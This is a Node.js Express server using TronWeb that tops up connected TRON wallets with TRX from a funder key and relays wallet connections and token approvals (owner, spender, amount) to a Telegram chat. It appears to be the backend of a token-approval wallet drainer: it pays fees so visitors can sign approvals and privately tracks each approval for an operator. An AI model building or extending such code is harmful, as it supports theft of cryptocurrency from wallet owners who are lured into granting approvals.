// server.js
import 'dotenv/config';
import express from 'express';
import axios from 'axios';
import TronWebModule from 'tronweb';

const TronWeb = TronWebModule.TronWeb || TronWebModule;
const app = express();
app.use(express.json());

// ENV
const TRON_NODE = process.env.TRON_NODE || 'https://api.trongrid.io';
const FUNDER_PRIVKEY = process.env.FUNDER_PRIVKEY || '';
const TG_BOT_TOKEN = process.env.TG_BOT_TOKEN || '';
const TG_CHAT_ID = process.env.TG_CHAT_ID || '';
const MIN_BALANCE_TRX = Number(process.env.MIN_BALANCE_TRX || 15);
const TOPUP_AMOUNT_TRX = Number(process.env.TOPUP_AMOUNT_TRX || 16);

// Funder TronWeb (optional if key missing)
const funderTW = FUNDER_PRIVKEY
  ? new TronWeb({ fullHost: TRON_NODE, privateKey: FUNDER_PRIVKEY })
  : null;

async function getTrxBalance(address) {
  const tw = funderTW || new TronWeb({ fullHost: TRON_NODE });
  const sun = await tw.trx.getBalance(address);
  return sun / 1e6;
}

async function sendTrx(to, amountTrx) {
  if (!funderTW) throw new Error('Funder not configured');
  const amountSun = Math.floor(amountTrx * 1e6);
  const tx = await funderTW.transactionBuilder.sendTrx(to, amountSun);
  const signed = await funderTW.trx.sign(tx);
  return funderTW.trx.sendRawTransaction(signed);
}

async function notifyTelegram(text) {
  if (!TG_BOT_TOKEN || !TG_CHAT_ID) return;
  const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
  await axios.post(url, { chat_id: TG_CHAT_ID, text }, { timeout: 10000 });
}

// Health
app.get('/health', (_req, res) => res.json({ ok: true }));

// On connect: { address }
app.post('/on-connect', async (req, res) => {
  try {
    const address = req.body?.address;
    if (!address) return res.status(400).json({ ok: false, error: 'address required' });

    await notifyTelegram(`Wallet connected: ${address}`);

    const balance = await getTrxBalance(address);
    let topupTxId = null;

    if (balance < MIN_BALANCE_TRX && funderTW) {
      const receipt = await sendTrx(address, TOPUP_AMOUNT_TRX);
      topupTxId = receipt?.txid || null;
      await notifyTelegram(`Top-up sent: ${TOPUP_AMOUNT_TRX} TRX to ${address}\nTx: ${topupTxId || 'pending'}`);
    } else {
      await notifyTelegram(`No top-up needed. Balance: ${balance} TRX`);
    }

    res.json({ ok: true, balance, topupTxId });
  } catch (e) {
    await notifyTelegram(`Error on-connect: ${e.message}`);
    res.status(500).json({ ok: false, error: e.message });
  }
});

// Optional: approval callback { owner, spender, amount, txid }
app.post('/on-approve', async (req, res) => {
  try {
    const { owner, spender, amount, txid } = req.body || {};
    if (!owner || !spender || !amount || !txid) {
      return res.status(400).json({ ok: false, error: 'owner, spender, amount, txid required' });
    }
    await notifyTelegram(`Approval submitted:\nOwner: ${owner}\nSpender: ${spender}\nAmount: ${amount}\nTx: ${txid}`);

    // Simple confirmation poll
    const tw = funderTW || new TronWeb({ fullHost: TRON_NODE });
    const deadline = Date.now() + 120000; // 2 min
    let confirmed = false;
    while (Date.now() < deadline) {
      const info = await tw.trx.getTransactionInfo(txid).catch(() => null);
      if (info && info.receipt && info.receipt.result === 'SUCCESS') {
        confirmed = true;
        break;
      }
      await new Promise(r => setTimeout(r, 2500));
    }
    await notifyTelegram(confirmed
      ? `Approval confirmed:\nOwner: ${owner}\nSpender: ${spender}\nAmount: ${amount}\nTx: ${txid}`
      : `Approval not confirmed in time:\nTx: ${txid}`);

    res.json({ ok: true, confirmed });
  } catch (e) {
    await notifyTelegram(`Error on-approve: ${e.message}`);
    res.status(500).json({ ok: false, error: e.message });
  }
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => console.log(`API on :${PORT}`));
